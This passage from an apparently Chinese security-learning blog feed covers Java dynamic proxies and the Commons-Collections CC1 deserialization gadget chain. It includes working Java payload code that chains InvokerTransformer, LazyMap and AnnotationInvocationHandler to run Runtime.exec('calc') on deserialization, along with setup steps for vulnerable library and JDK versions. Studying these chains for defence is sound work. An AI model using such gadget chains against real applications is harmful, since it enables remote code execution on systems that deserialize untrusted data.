class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;);<br><br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span>  LazyMap.decorate(hashMap, chainedTransformer);<br><br>    Class&lt;?&gt; annotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    Constructor&lt;?&gt; declaredConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>    declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance(Target.class,lazymap);<br><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>            (Class&lt;?&gt;[]) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, (InvocationHandler) h);<br><br>    h = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);<br><br>    serializable(h);<br>    unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">AnnotationInvocationHandler<span class="hljs-selector-class">.readObject</span>()<br>AnnotationInvocationHandler<span class="hljs-selector-class">.invoke</span>()<br>lazymap<span class="hljs-selector-class">.get</span>()<br>ChainedTransformer<span class="hljs-selector-class">.transform</span>()<br>和CC1的TransformedMap后一致<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java动态代理</title>
      <link href="/2025/03/24/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2025/03/24/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="代理："><a href="#代理：" class="headerlink" title="代理："></a>代理：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">租客，房东，中介<br>中介就相当于代理<br></code></pre></td></tr></table></figure><p>静态代理：自己写代码</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>UserProxyInvocationHandler.java 动态代理实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DongTai;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxyInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">// 被代理的接口</span><br>    <span class="hljs-keyword">private</span> UserService userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserService userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-comment">// 动态生成代理类实例</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(), userService.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-comment">// 处理代理类实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> method.invoke(userService, args);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-comment">//业务自定义需求</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(Method method)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;[Info] &quot;</span> + method.getName() + <span class="hljs-string">&quot;方法被调用&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>UserServiceImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DongTai;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 真实角色</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userServiceImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">// 代理角色，不存在</span><br>        <span class="hljs-type">UserProxyInvocationHandler</span> <span class="hljs-variable">userProxyInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProxyInvocationHandler</span>();<br>        userProxyInvocationHandler.setUserService((UserService) userServiceImpl); <span class="hljs-comment">// 设置要代理的对象</span><br><br>        <span class="hljs-comment">// 动态生成代理类</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) userProxyInvocationHandler.getProxy();<br><br>        proxy.add();<br>        proxy.delete();<br>        proxy.update();<br>        proxy.query();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>UserServiceImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DongTai;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;更新了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>USerService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DongTai;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>readObject</code> 方法在反序列化当中会被自动执行，而 <code>invoke</code> 方法在动态代理当中会自动执行。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">A[O] -&gt; O.abc<br>O[O2]<span class="hljs-built_in"> invoke </span>-&gt; O2.f // 此时将 B 去替换 O2<br>最后  ----&gt;<br>O[B]<span class="hljs-built_in"> invoke </span>-&gt; B.f // 达到漏洞利用效果<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-CC1-Transformer链</title>
      <link href="/2025/03/13/Java-CC1-Transformer%E9%93%BE/"/>
      <url>/2025/03/13/Java-CC1-Transformer%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h3 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h3><p>Java反序列化</p><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><ul><li>CommonsCollections &lt;&#x3D; 3.2.1</li><li>java &lt; 8u71（我使用的是）</li></ul><h4 id="java8u65"><a href="#java8u65" class="headerlink" title="java8u65"></a>java8u65</h4><p>环境链接先不放，在配置环境的时候遇到一件很神奇的事：</p><p>下面是oracle的java8存档地址，真的很神，第一个链接是中文的，当你使用<code>Ctrl + F</code>去找<code>java8u65</code>（第8个版本的第六十五次更新）的时候，下载的是java8u111，我以为只有一个是不对的，多试了几个都不对。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.oracle.com<span class="hljs-regexp">/cn/</span>java<span class="hljs-regexp">/technologies/</span>javase/javase8-archive-downloads.html<br><br>https:<span class="hljs-regexp">//</span>www.oracle.com<span class="hljs-regexp">/java/</span>technologies<span class="hljs-regexp">/javase/</span>javase8-archive-downloads.html<br></code></pre></td></tr></table></figure><p>因为只是使用java运行，不需要配置环境变量，只需要在idea中修改项目结构中的解释器目录。</p><p><strong>此外，还需要配置一下源码</strong></p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>在左边侧栏下载压缩包，打开压缩包，找到以下目录</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">解压目录\src\share\classes\sun<br></code></pre></td></tr></table></figure><p>复制sun包中的内容到java8u65的src目录中，默认是没有src目录的，解压该目录中的src.zip文件，在idea项目结构中sourcepath，导入src目录。</p><h4 id="CommonsCollections"><a href="#CommonsCollections" class="headerlink" title="CommonsCollections"></a>CommonsCollections</h4><p>在idea创建maven项目，配置文件pom.xml中添加，junit是用于测试的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>环境配置完毕，应该没有了吧，。</p><h3 id="ysoserial中给到的链子"><a href="#ysoserial中给到的链子" class="headerlink" title="ysoserial中给到的链子"></a>ysoserial中给到的链子</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">Map(Proxy).entrySet()</span><br><span class="hljs-comment">AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">LazyMap.get()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br><span class="hljs-comment">ConstantTransformer.transform()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Class.getMethod()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.getRuntime()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>看不懂也不要慌，遇事不要慌。一步一步来。</p><h3 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform()"></a>InvokerTransformer.transform()</h3><p>找到<code>org.apache.commons.collections.transformer</code> 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ctrl + alt + b</code>或者<code>ctrl + h</code><br>寻找向下的继承类</p><p>找到个<code>org.apache.commons.collections.functors.InvokerTransformer</code>的类</p><p>InvokerTransformer.java实现了transformer接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>        <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        <br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>try语句中使用反射，尝试调用了transform方法接受的对象的方法，因为是使用的<code>getMethod</code>方法，所以调用公共方法才不会报错。</p><p>调用的函数参数iMethodName，iParamTypes，iArgs，都可以在实例化InvokerTransformer类时传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    iMethodName = methodName;<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以尝试一下执行命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>将Runtime.getRuntime()对象传入，满足以下条件。</p><h4 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">methodName</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> exec 函数名<br>Object input <span class="hljs-operator">=</span><span class="hljs-operator">=</span> Runtime.getRuntime() 执行函数的对象<br><span class="hljs-attribute">paramTypes</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> String.class 函数参数的类型<br><span class="hljs-attribute">args</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc.exe&quot;</span> 函数实参<br></code></pre></td></tr></table></figure><h4 id="payload升级："><a href="#payload升级：" class="headerlink" title="payload升级："></a>payload升级：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br><br>    invokerTransformer.transform(Runtime.getRuntime());<br>&#125;<br></code></pre></td></tr></table></figure><p>弹出计算机为成功</p><h3 id="TranformedMap-checkSetValue"><a href="#TranformedMap-checkSetValue" class="headerlink" title="TranformedMap.checkSetValue()"></a>TranformedMap.checkSetValue()</h3><p>alt+F7查看用法</p><p>org.apache.commons.collections.map.TranformedMap</p><p>TranformedMap.java找到了三个方法调用了<code>transform</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>&#125;<br><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformKey</span><span class="hljs-params">(Object object)</span> &#123;<br>    <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>&#125;<br><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformValue</span><span class="hljs-params">(Object object)</span> &#123;<br>    <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>&#125;<br></code></pre></td></tr></table></figure><p>三个方法属性都是<code>protected</code>，对同一包内的类和所有子类可见。</p><p>三个方法中选择checkSetValue()，为社么不用其他两个呢，其他两个查找用法，没有找到合适的调用类。</p><p>找到对参数进行赋值的地方，是TransformedMap类的构造函数，构造函数属性为<code>protected</code>，对同一包内的类和所有子类可见。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>    <span class="hljs-built_in">super</span>(map);<br>    <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>    <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>&#125;<br></code></pre></td></tr></table></figure><p>寻找其他构造方法或者调用<code>TransformedMap</code>的方法。</p><p>在同一个类中找到方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们有了办法构造参数，但是无法调用<code>TransformedMap.checkSetValue()</code>方法，继续查找用法。</p><h3 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h3><p><code>AbstractInputCheckedMapDecorator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><br>    <span class="hljs-comment">/** The parent map */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(entry);<br>        <span class="hljs-built_in">this</span>.parent = parent;<br>    &#125;<br><br>    <span 